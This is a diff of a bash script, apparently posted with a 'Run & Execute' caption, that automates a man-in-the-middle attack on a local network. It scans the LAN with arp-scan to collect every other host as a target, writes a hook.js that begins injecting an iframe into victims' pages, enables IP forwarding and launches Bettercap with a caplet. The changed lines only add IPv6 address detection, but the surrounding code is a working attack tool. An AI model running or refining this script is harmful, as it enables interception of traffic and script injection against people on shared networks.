@@ -83,9 +83,18 @@ fi
 # ========================
 clear
 IFACE=$(ip route | awk '/^default/ {print $5; exit}')
-LAN=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
+LAN4=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
+LAN6=$(ip -6 addr show "$IFACE" | awk '/inet6 / && !/fe80/ {print $2}' | cut -d/ -f1 | head -1)
+
 color_print GREEN "[*] Interface: $IFACE"
-color_print GREEN "[*] Local IP: $LAN"
+[[ -n "$LAN4" ]] && color_print GREEN "[*] Local IPv4: $LAN4"
+[[ -n "$LAN6" ]] && color_print GREEN "[*] Local IPv6: $LAN6"
+
+if [[ -n "$LAN4" ]]; then
+    LAN="$LAN4"
+else
+    LAN="$LAN6"
+fi
 
 # ========================
 # --- CLEANUP OLD FILES ---
@@ -186,7 +195,7 @@ service apache2 restart
 color_print CYAN "[*] Scanning network..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
     awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
-    grep -v "$LAN" | sort -u | paste -sd ',' -)
+    grep -v "$LAN4" | sort -u | paste -sd ',' -)
 
 cat > "$MITM_DIR/hook.js" <<EOF
 const iframe = document.createElement('iframe');
@@ -238,6 +247,7 @@ EOF
 color_print GREEN "[*] Launching Bettercap..."
 sysctl -w net.ipv4.ip_forward=1
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/fallback.cap"
+
 ```
 
 _Run & Execute_
